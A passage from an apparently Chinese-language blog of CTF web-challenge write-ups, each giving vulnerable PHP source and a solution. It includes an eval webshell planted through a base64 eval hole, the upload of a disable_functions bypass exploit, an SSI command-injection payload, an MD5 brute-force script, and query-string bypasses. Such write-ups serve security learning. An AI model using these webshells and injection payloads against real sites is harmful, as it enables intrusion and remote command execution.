<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较简单的一道题。</p>
<p>第一个为MD5强类型比较，这时候传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。</p>
<p>第二个为is_numeric函数弱类型，用<code>1234567abc</code>绕过。</p>
<h2 id="BJDCTF2020-Mark-loves-cat">BJDCTF2020 Mark loves cat</h2>
<h3 id="考点-v4">考点</h3>
<ul>
<li>Git源码泄露</li>
<li>变量覆盖</li>
</ul>
<h3 id="解题-v4">解题</h3>
<p><strong>关键在于要认识到<code>exit()</code>也是可以是输出的</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure>
<p>先来分析三个if语句：</p>
<ol>
<li>
<p>第一个if语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>键名为flag的键值绝对等于其中某一个键值，并且键名不能有flag。前后相互矛盾，进不去这个判断。</p>
</li>
<li>
<p>第二个if语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不存在GET型的flag参数，也不存在POST型的flag参数。</p>
</li>
<li>
<p>第三个if语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POST型flag参数值绝对等于flag，GET型flag参数值绝对等于flag。</p>
</li>
</ol>
<p>如果想通过第二个if语句来输出flag的话，就要去覆盖<code>$flag</code>，即<code>$yds=$flag</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么就可以直接GET传参：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?yds&#x3D;flag</span><br></pre></td></tr></table></figure>
<p>相当于<code>$yds=$flag</code>。</p>
<p>如果想通过第三个if语句来输出flag，就要去覆盖<code>$is</code>，即<code>$is=$flag</code>，并且GET中要有flag参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?is&#x3D;flag&amp;flag&#x3D;flag</span><br></pre></td></tr></table></figure>
<h2 id="GKCTF2020-CheckIN">GKCTF2020 CheckIN</h2>
<h3 id="考点-v5">考点</h3>
<ul>
<li>disable_function绕过</li>
</ul>
<h3 id="解题-v5">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>
<p>看一下phpinfo，发现禁用了很多执行系统命令的函数。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702101014.png" alt=""></p>
<p>写一个shell用蚁剑连接，<code>eval($_POST[123]);</code>，经过base64编码是<code>ZXZhbCgkX1BPU1RbMTIzXSk7</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702102011.png" style="zoom:67%;" />
<p>浏览根目录发现要用<code>readflag</code>读取flag文件，上传<a href="https://raw.githubusercontent.com/mm0r1/exploits/master/php7-gc-bypass/exploit.php">php7-diable_function-bypass</a> Poc至/tmp目录下，然后用include包含该文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702102424.png" alt=""></p>
<h2 id="GWCTF2019-枯燥的抽奖">GWCTF2019 枯燥的抽奖</h2>
<h3 id="考点-v6">考点</h3>
<h3 id="解题-v6">解题</h3>
<p>查看源代码有一段JS代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#div1&quot;</span>).load(<span class="string">&quot;check.php #p1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $(<span class="string">&quot;.close&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        		$(<span class="string">&quot;#myAlert&quot;</span>).hide();</span><br><span class="line">    &#125;);	     </span><br><span class="line"></span><br><span class="line">    $(<span class="string">&quot;#button1&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	$(<span class="string">&quot;#myAlert&quot;</span>).hide();</span><br><span class="line">    	guess=$(<span class="string">&quot;input&quot;</span>).val();</span><br><span class="line">		$.ajax(&#123;</span><br><span class="line">	   type: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">	   url: <span class="string">&quot;check.php&quot;</span>,</span><br><span class="line">	   data: <span class="string">&quot;num=&quot;</span>+guess,</span><br><span class="line">		   success: <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">		     $(<span class="string">&quot;#div2&quot;</span>).append(msg);</span><br><span class="line">		     alertmsg = $(<span class="string">&quot;#flag&quot;</span>).text(); </span><br><span class="line">		     <span class="keyword">if</span>(alertmsg==<span class="string">&quot;没抽中哦，再试试吧&quot;</span>)&#123;</span><br><span class="line">		      $(<span class="string">&quot;#myAlert&quot;</span>).attr(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-warning&quot;</span>);</span><br><span class="line">		      <span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).text()==<span class="string">&quot;&quot;</span>)</span><br><span class="line">		     	$(<span class="string">&quot;#new&quot;</span>).append(alertmsg);</span><br><span class="line">		     &#125;</span><br><span class="line">		     <span class="keyword">else</span>&#123;		     	</span><br><span class="line">		     	$(<span class="string">&quot;#myAlert&quot;</span>).attr(<span class="string">&quot;class&quot;</span>,<span class="string">&quot;alert alert-success&quot;</span>);</span><br><span class="line">		     	<span class="keyword">if</span>($(<span class="string">&quot;#new&quot;</span>).text()==<span class="string">&quot;&quot;</span>)	</span><br><span class="line">		     		$(<span class="string">&quot;#new&quot;</span>).append(alertmsg);	</span><br><span class="line">		     &#125;</span><br><span class="line"></span><br><span class="line">		 </span><br><span class="line">		   &#125;</span><br><span class="line">		&#125;); </span><br><span class="line">		$(<span class="string">&quot;#myAlert&quot;</span>).show();</span><br><span class="line">		$(<span class="string">&quot;#new&quot;</span>).empty();</span><br><span class="line">		 $(<span class="string">&quot;#div2&quot;</span>).empty();</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>再去看<code>check.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ODuHdhCHWY</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-EasySearch">BJDCTF2020 EasySearch</h2>
<h3 id="考点-v7">考点</h3>
<ul>
<li>MD5截断验证</li>
</ul>
<h3 id="解题-v7">解题</h3>
<p>用dirmap扫一遍，发现<code>index.php.swp</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		$content = uniqid().$random;</span><br><span class="line">		<span class="keyword">return</span> sha1($content); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            $file_shtml = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            $text = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码第14行明显是考察MD5截断认证，直接用脚本爆破</p>
<blockquote>
<p>参考：<a href="https://www.cnblogs.com/yesec/p/11297568.html">https://www.cnblogs.com/yesec/p/11297568.html</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">&#x27;6d0bc1&#x27;</span>      <span class="comment">#已知的md5明文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">text</span>):</span> </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findCode</span>(<span class="params">code</span>):</span>   </span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])  </span><br><span class="line">    end = int(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">6</span>] == knownMd5:            </span><br><span class="line">            <span class="keyword">print</span> code</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">list=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):    <span class="comment">#这里的range(number)指爆破出多少结果停止</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#使用多线程加快爆破速度</span></span><br><span class="line">pool.map(findCode, list) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>
<p>得到password:2020666</p>
<p>然后以admin，2020666登录，在header中发现随机生成的文件所在路径。访问之，发现界面为：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705153955.png" alt=""></p>
<p>看到这个admin猜测肯定有模板注入，但是用<code>&#123;&#123;7*'7'&#125;&#125;</code>验证一直返回fail，查阅wp得知是SSI注入（我之前都没听过）。</p>
<blockquote>
<p>可以通过public文件夹下的文件后缀名.shtml得到线索</p>
<p><a href="https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">参考文章</a></p>
</blockquote>
<p>在username设置<code>&lt;!--#exec cmd=&quot;命令&quot;--&gt;﻿</code>，即可执行命令。</p>
<h3 id="拓展-v2">拓展</h3>
<p>另一种形式的MD5截断验证：</p>
<p><a href="https://www.cnblogs.com/yesec/p/11300841.html">https://www.cnblogs.com/yesec/p/11300841.html</a></p>
<h2 id="MRCTF2020-套娃">MRCTF2020 套娃</h2>
<h3 id="考点-v8">考点</h3>
<ul>
<li><code>$_SERVER['QUERY_STRING']</code>绕过</li>
<li>代码审计</li>
</ul>
<h3 id="解题-v8">解题</h3>
<h4 id="第一层">第一层</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>题外话：<code>$_SERVER['QUERY_STRING']</code>不会进行URLDecode，而<code>$_GET[]</code>会将参数进行URLDecode</p>
</blockquote>
<p>利用PHP的字符串解析特性Bypass第一个if语句。</p>
<blockquote>
<p>参考文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
</blockquote>
<p>第二个if中正则匹配表示匹配字符串的开头和结尾，由于在字符串中换行可以表示字符串的结尾，所以可以用%0a绕过。</p>
<blockquote>
<p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
</blockquote>
<p>所以第一层的payload就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708195848.png" alt=""></p>
<h4 id="第二层">第二层</h4>
<p>查看源代码，有一大串的JSFuck编码，直接拿到console跑</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708200030.png" alt=""></p>
<p>提示需要POST一下Merak数据，内容任意。继续审计代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>只允许本地登录，那么就加上<code>Client-IP:127.0.0.1</code>的Header。接着使用data伪协议从<code>2333</code>参数中读取<code>todat is a happy day</code>。</p>
<p>接下来就是逆向change函数，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr(ord($v[$i]) - $i*<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$real = unchange(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($real);</span><br></pre></td></tr></table></figure>
<p>所以第二层的payload就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?2333&#x3D;data:text&#x2F;plain,tadat is a happy day&amp;file&#x3D;ZmpdYSZmXGI&#x3D;</span><br></pre></td></tr></table></figure>
<h2 id="Zer0pts2020-Can-you-guess-it">[Zer0pts2020]Can you guess it?</h2>
<h3 id="考点-v9">考点</h3>
<ul>
<li><code>$_SEVER['PHP_SELF']</code>利用</li>
<li><code>basename()</code>绕过</li>
</ul>
<h3 id="解题-v9">解题</h3>
<p>利用点在:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是前面还有过滤：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
